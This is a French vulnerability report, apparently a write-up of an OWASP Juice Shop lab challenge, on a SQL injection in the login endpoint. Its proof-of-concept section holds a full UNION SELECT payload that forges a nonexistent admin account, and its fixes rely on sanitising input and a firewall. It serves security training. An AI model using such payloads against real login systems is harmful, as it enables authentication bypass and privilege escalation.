# Rapport de Vulnérabilité

## Vulnérabilité

| Champ                      | Détails                                                                 |
|----------------------------|-------------------------------------------------------------------------|
| **Type**                   | Injection SQL — UNION SELECT (Compte éphémère)                          |
| **Composant affecté**      | Endpoint d'authentification — `POST /rest/user/login`                   |
| **Sévérité**               | 🔴 Critique                                                             |

---

## Méthodologie

### Techniques utilisées
- Injection SQL
- Énumération du schéma de base de données

### Outils utilisés

| Outil              | Objectif                                          |
|--------------------|---------------------------------------------------|
| Navigateur / Burp Suite | Injection du payload dans le champ email   |

### Étapes

1. **Identification de la cible** — Le challenge demande de se connecter en tant que `acc0unt4nt@juice-sh.op`, un compte qui n'existe pas en base de données.

2. **Construction du payload UNION** — On forge une requête `UNION SELECT` qui injecte une ligne correspondant exactement au schéma de la table `Users`, avec l'email `acc0unt4nt@juice-sh.op` et un mot de passe connu.

3. **Injection au login** — Le payload est injecté dans le champ `email` du formulaire de connexion. La requête SQL côté serveur, au lieu de chercher un utilisateur existant, retourne la ligne forgée par le `UNION SELECT`.

4. **Connexion réussie** — Le serveur authentifie l'utilisateur sur la base de la ligne injectée. Le compte `acc0unt4nt@juice-sh.op` n'a jamais été créé en base de données.

---

### Preuve de concept

**Payload injecté dans le champ `email` :**
```sql
acc0unt4nt@juice-sh.op' UNION SELECT * FROM (
  SELECT
    15 as 'id',
    '' as 'username',
    'acc0unt4nt@juice-sh.op' as 'email',
    '12345' as 'password',
    'admin' as 'role',
    '123' as 'deluxeToken',
    '1.2.3.4' as 'lastLoginIp',
    '/assets/public/images/uploads/default.svg' as 'profileImage',
    '' as 'totpSecret',
    1 as 'isActive',
    '1999-08-16 14:14:41.644 +00:00' as 'createdAt',
    '1999-08-16 14:14:41.644 +00:00' as 'updatedAt',
    NULL as 'deletedAt'
)--
```

---

## Risques

### Impact

- **Contournement total de l'authentification** — connexion possible en tant que n'importe quel utilisateur fictif avec les droits souhaités (ici `role: admin`)
- **Usurpation d'identité** — création d'une session au nom d'un compte inexistant, indétectable dans les logs utilisateurs classiques
- **Élévation de privilèges** — le rôle étant contrôlé par le payload, l'attaquant peut s'attribuer n'importe quel niveau d'accès
- **Accès à des données sensibles** — une session admin forgée donne accès à l'ensemble du back-office

---

## Correction

### Correctifs


- Valider et assainir le champ `email` avant toute utilisation en requête
- Ne jamais exposer la structure interne de la base de données via des messages d'erreur SQL

### Bonnes pratiques de sécurité recommandées

- Suivre les directives OWASP Top 10 
- Mettre en place un WAF pour détecter et bloquer les patterns d'injection SQL courants